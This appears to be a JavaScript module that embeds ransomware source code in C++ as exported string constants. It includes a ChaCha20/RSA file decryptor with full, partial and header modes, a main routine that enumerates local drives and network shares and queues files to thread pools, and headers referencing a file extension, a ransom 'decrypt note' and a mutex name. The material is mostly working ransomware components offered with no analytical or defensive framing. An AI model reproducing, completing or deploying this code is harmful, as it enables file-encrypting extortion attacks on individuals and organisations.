	DWORD BytesRead = 0;
	DWORD BytesToRead = 0;
	DWORD BytesToWrite = 0;
	LONGLONG TotalRead = 0;
	LONGLONG BytesToEncrypt;
	LARGE_INTEGER Offset;

	BytesToEncrypt = FileInfo->OriginalFileSize;

	while (TotalRead < BytesToEncrypt) {

		LONGLONG BytesLeft = BytesToEncrypt - TotalRead;
		BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;

		Success = ReadFile(FileInfo->FileHandle, Buffer, BytesToRead, &BytesRead, NULL);
		if (!Success || !BytesRead) {
			break;
		}

		TotalRead += BytesRead;
		BytesToWrite = BytesRead;

		ECRYPT_decrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);

		Offset.QuadPart = -((LONGLONG)BytesRead);
		if (!SetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {
			break;
		}

		Success = WriteDecryptedData(FileInfo->FileHandle, Buffer, BytesToWrite);
		if (!Success) {
			break;
		}

	}

	return TRUE;
}

BOOL
decryptor::Decrypt(
	__in decryptor::LPFILE_INFO FileInfo,
	__in LPBYTE Buffer,
	__in HCRYPTPROV CryptoProvider,
	__in HCRYPTKEY PrivateKey
)
{
	DWORD BytesToRead = 0;
	LONGLONG TotalRead = 0;
	BOOL Result = FALSE;

	if (!OpenFileDecrypt(FileInfo)) {
		return FALSE;
	}

	DWORD EncryptedKeySize = 524;
	if (!CryptDecrypt(PrivateKey, 0, TRUE, 0, FileInfo->EncryptedKey, &EncryptedKeySize)) {
		return FALSE;
	}

	memory::Copy(FileInfo->ChachaKey, FileInfo->EncryptedKey, 32);
	memory::Copy(FileInfo->ChachaIV, FileInfo->EncryptedKey + 32, 8);
	ECRYPT_keysetup(&FileInfo->CryptCtx, FileInfo->ChachaKey, 256, 64);
	ECRYPT_ivsetup(&FileInfo->CryptCtx, FileInfo->ChachaIV);

	if (FileInfo->EncryptMode == FULL_ENCRYPT) {

		Result = DecryptFull(FileInfo, Buffer, CryptoProvider);

	}
	else if (FileInfo->EncryptMode == PARTLY_ENCRYPT) {

		Result = DecryptPartly(FileInfo, Buffer, CryptoProvider, FileInfo->DataPercent);

	}
	else if (FileInfo->EncryptMode == HEADER_ENCRYPT) {

		Result = DecryptHeader(FileInfo, Buffer, CryptoProvider);

	}

	LARGE_INTEGER Offset;
	Offset.QuadPart = -534;
	if (SetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_END)) {
		SetEndOfFile(FileInfo->FileHandle);
	}

	return Result;
}


/*
STATIC
DWORD
WINAPI EventHandler(__in LPVOID Args)
{
	HCRYPTKEY RsaKey;
	HCRYPTPROV CryptoProvider;

	LPVOID Buffer = VirtualAlloc(NULL, BufferSize + 32, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!Buffer) {
		ExitThread(EXIT_FAILURE);
	}

	if (!GetCryptoProvider(&CryptoProvider)) {
		return FALSE;
	}

	if (!CryptImportKey(CryptoProvider, g_PrivateKey, sizeof(g_PrivateKey), 0, 0, &RsaKey)) {
		ExitThread(EXIT_FAILURE);
	}

	for (;;)
	{

		DWORD BytesTransferred;
		ULONG_PTR CompletionKey;
		decryptor::LPFILE_INFO FileInfo;

		if (!GetQueuedCompletionStatus(g_IocpHandle, &BytesTransferred, &CompletionKey, (LPOVERLAPPED*)&FileInfo, INFINITE)) {
			ExitThread(EXIT_FAILURE);
		}

		if (CompletionKey == EXIT_COMPLETION_KEY) {
			ExitThread(EXIT_SUCCESS);
		}

		if (Decrypt(FileInfo, (LPBYTE)Buffer, CryptoProvider, RsaKey))
		{

			CloseHandle(FileInfo->FileHandle);
			FileInfo->FileHandle = INVALID_HANDLE_VALUE;
			ChangeFileName(FileInfo->Filename);

		}

		CloseFile(FileInfo);

		memory::Free(FileInfo->Filename);
		GlobalFree(FileInfo);

	}

	VirtualFree(Buffer, 0, MEM_RELEASE);
	CryptDestroyKey(RsaKey);
	ExitThread(EXIT_SUCCESS);
}
*/`;

export const DECRYPTOR_H = `#pragma once
#include "common.h"
#include "chacha20/ecrypt-sync.h"
#include "queue.h"
#include "memory.h"

namespace decryptor {

	typedef struct file_info {

		LPCWSTR Filename;
		HANDLE FileHandle;
		LONGLONG FileSize;
		LONGLONG OriginalFileSize;
		BYTE ChachaKey[32];
		BYTE ChachaIV[8];
		BYTE EncryptMode;
		BYTE DataPercent;
		ECRYPT_ctx CryptCtx;
		BYTE EncryptedKey[524];
		TAILQ_ENTRY(file_info) Entries;

	} FILE_INFO, * LPFILE_INFO;

	typedef TAILQ_HEAD(file_list, file_info) FILE_LIST, * PFILE_LIST;

	BOOL
		Decrypt(
			__in LPFILE_INFO FileInfo,
			__in LPBYTE Buffer,
			__in HCRYPTPROV CryptoProvider,
			__in HCRYPTKEY PrivateKey
		);

	BOOL
		ChangeFileName(__in LPCWSTR OldName);

	VOID
		CloseFile(__in decryptor::LPFILE_INFO FileInfo);

};`;

export const MAIN_CPP = `
#include "common.h"
#include "filesystem.h"
#include "network_scanner.h"
#include "threadpool.h"
#include <Shlwapi.h>
#include "global_parameters.h"
#include "decryptor.h"

#pragma comment(lib, "Shell32.lib")


enum EncryptModes {

	ALL_ENCRYPT = 10,
	LOCAL_ENCRYPT = 11,
	NETWORK_ENCRYPT = 12

};

typedef struct string_ {

	WCHAR wszString[16384];
	TAILQ_ENTRY(string_) Entries;

} STRING, * PSTRING;

typedef TAILQ_HEAD(string_list_, string_) STRING_LIST, * PSTRING_LIST;

STATIC INT g_EncryptMode = ALL_ENCRYPT;
STATIC STRING_LIST g_HostList;
STATIC STRING_LIST g_PathList;

int main()
{
	HANDLE hLocalSearch = NULL;
	filesystem::DRIVE_LIST DriveList;
	network_scanner::SHARE_LIST ShareList;

	TAILQ_INIT(&DriveList);
	TAILQ_INIT(&ShareList);

	SYSTEM_INFO SysInfo;
	GetNativeSystemInfo(&SysInfo);

	DWORD dwLocalThreads = SysInfo.dwNumberOfProcessors;
	DWORD dwNetworkThreads = SysInfo.dwNumberOfProcessors;

	if (!threadpool::Create(threadpool::LOCAL_THREADPOOL, dwLocalThreads)) {
		return EXIT_FAILURE;
	}

	if (!threadpool::Start(threadpool::LOCAL_THREADPOOL)) {
		return EXIT_FAILURE;
	}

	if (!threadpool::Create(threadpool::NETWORK_THREADPOOL, dwNetworkThreads)) {
		return EXIT_FAILURE;
	}

	if (!threadpool::Start(threadpool::NETWORK_THREADPOOL)) {
		return EXIT_FAILURE;
	}

	//filesystem::SearchFiles(L"C:\\users\\toha\\Desktop\\test", threadpool::LOCAL_THREADPOOL);

	if (filesystem::EnumirateDrives(&DriveList)) {
		hLocalSearch = CreateThread(NULL, 0, filesystem::StartLocalSearch, &DriveList, 0, NULL);
	}

	PSTRING String = NULL;
	TAILQ_FOREACH(String, &g_HostList, Entries) {
		network_scanner::EnumShares(String->wszString, &ShareList);
	}

	network_scanner::PSHARE_INFO ShareInfo = NULL;
	TAILQ_FOREACH(ShareInfo, &ShareList, Entries) {
		filesystem::SearchFiles(ShareInfo->wszSharePath, threadpool::NETWORK_THREADPOOL);
	}

	network_scanner::StartScan();
	WaitForSingleObject(hLocalSearch, INFINITE);
	threadpool::Wait(threadpool::LOCAL_THREADPOOL);
	threadpool::Wait(threadpool::NETWORK_THREADPOOL);
	return EXIT_SUCCESS;
}
`;

export const COMMON_H = `
#pragma once
#include <WinSock2.h>
#include <string>
#include <iostream>
#include "MetaString.h"

#define STATIC static

inline PVOID m_malloc(SIZE_T Size)
{
	PVOID buf = malloc(Size);
	if (buf) {
		memset(buf, 0, Size);
	}

	return buf;
}

inline VOID m_free(PVOID Memory)
{
	free(Memory);
}
`;

export const FILESYSTEM_H = `
#pragma once
#include "common.h"
#include "queue.h"
#include "memory.h"

namespace filesystem {

	typedef struct drive_info_ {

		std::wstring RootPath;
		TAILQ_ENTRY(drive_info_) Entries;

	} DRIVE_INFO, *PDRIVE_INFO;

	typedef TAILQ_HEAD(drive_list_, drive_info_) DRIVE_LIST, * PDRIVE_LIST;

	INT EnumirateDrives(PDRIVE_LIST DriveList);
	VOID SearchFiles(std::wstring StartDirectory, INT ThreadPoolID);
	DWORD WINAPI StartLocalSearch(PVOID pArg);

}
`;

export const THREAD_POOL_H = `
#pragma once
#include "common.h"
#include "queue.h"

#define STOP_MARKER L"stopmarker"
CONST DWORD BufferSize = 5242880;

namespace threadpool {

	enum THREADPOOLS {

		LOCAL_THREADPOOL,
		NETWORK_THREADPOOL

	};

	typedef TAILQ_HEAD(task_list_, task_info_) TASK_LIST, * PTASK_LIST;

	typedef struct task_info_ {

		std::wstring FileName;
		TAILQ_ENTRY(task_info_) Entries;

	} TASK_INFO, * PTASK_INFO;

	typedef struct threadpool_info_ {

		PHANDLE hThreads;
		SIZE_T ThreadsCount;
		SIZE_T TasksCount;
		CRITICAL_SECTION ThreadPoolCS;
		TASK_LIST TaskList;

	} THREADPOOL_INFO, * PTHREADPOOL_INFO;

	BOOL Create(INT ThreadPoolId, SIZE_T ThreadsCount);
	BOOL Start(INT ThreadPoolId);
	VOID Wait(INT ThreadPoolId);
	VOID Delete(INT ThreadPoolId);
	BOOL PutTask(INT ThreadPoolId, std::wstring Filename);

};
`;

export const GLOBAL_PARAMETERS_H = `
#pragma once
#include "common.h"

namespace global {

	PWCHAR GetExtention();
	PCHAR GetDecryptNote(PDWORD pdwDecryptNote);
	PCHAR GetMutexName();

}
`;

export const ENCRYPTION_ENV = `
ENCRYPTION_KEY = "yourdataissafewithus"
`;
